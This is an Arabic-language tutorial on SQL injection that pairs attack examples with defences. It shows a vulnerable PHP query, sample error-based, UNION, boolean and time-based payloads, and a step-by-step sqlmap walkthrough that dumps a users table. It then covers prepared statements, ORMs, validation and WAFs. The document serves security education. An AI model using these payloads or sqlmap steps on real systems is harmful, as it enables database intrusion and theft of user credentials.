SQL Injection - الهجوم والدفاع

من أخطر الثغرات على الإطلاق. تعلم كيف تحدث، كيف تُستغل، وكيف تحمي تطبيقك.

؟ ما هي SQL Injection؟

ثغرة تحدث لما التطبيق يجمع input المستخدم مع query قاعدة البيانات بدون تنظيف. المهاجم يحقن كود SQL ضار في input لاختراق القاعدة.

# كود ضعيف (PHP مثلاً)

$query = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'";

# لو المستخدم كتب:

email = ' OR '1'='1

# يصبح الاستعلام:

SELECT * FROM users WHERE email = '' OR '1'='1'

# يُرجع كل المستخدمين! 💥

📚 أنواع SQL Injection

1. Classic (In-band) SQLi

المهاجم يستخدم نفس القناة للـ attack و استخراج البيانات.

a) Error-Based

استغلال error messages لكشف بنية القاعدة.

' AND 1=CONVERT(int, (SELECT @@version))--

b) UNION-Based

استخدام UNION لدمج queries وعرض البيانات.

' UNION SELECT username, password FROM users--

2. Blind SQLi

ما تشوف البيانات مباشرة - تستنتجها من تصرفات التطبيق.

a) Boolean-Based

استنتاج حرف حرف بناءً على true/false responses.

' AND SUBSTRING(@@version,1,1)='M'--

b) Time-Based

استخدام SLEEP لاستنتاج البيانات من التأخير.

' OR IF(1=1, SLEEP(5), 0)--

3. Out-of-Band SQLi

استخراج البيانات عبر قناة خارجية (DNS, HTTP request).

4. Second-Order SQLi

الكود الضار يُخزن ثم يُنفذ في query آخر لاحقاً.

🎯 مثال عملي: استخدام sqlmap

الخطوة 1: اكتشاف نقطة حقن محتملة

أرسل URL مشبوه في Burp:

http://target.com/products?id=5

الخطوة 2: شغّل sqlmap

sqlmap -u "http://target.com/products?id=5" --dbs

# --dbs: يعرض قواعد البيانات

الخطوة 3: اختر قاعدة بيانات

sqlmap -u "..." -D production_db --tables

الخطوة 4: استخرج البيانات

sqlmap -u "..." -D production_db -T users --dump

🛡️ كيف تحمي تطبيقك؟

✅ 1. Prepared Statements (الأهم)

// PHP + PDO

$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");

$stmt->execute([$_POST['email']]);

✅ 2. ORMs

استخدم Eloquent (Laravel), SQLAlchemy (Python), Hibernate (Java) - كلهم يستخدمون parameterized queries تلقائياً.

✅ 3. Input Validation

تحقق من نوع البيانات. للأرقام استخدم intval()، للإيميلات فلتر.

✅ 4. Least Privilege

DB user حق التطبيق ما يحتاج SELECT/INSERT/UPDATE بس - ليس DBA.

✅ 5. WAF

ModSecurity أو Cloudflare WAF يحظر payloads SQLi المعروفة.

✅ 6. إخفاء أخطاء

في production: display_errors = Off. أخطاء DB ما تظهر للمستخدم.
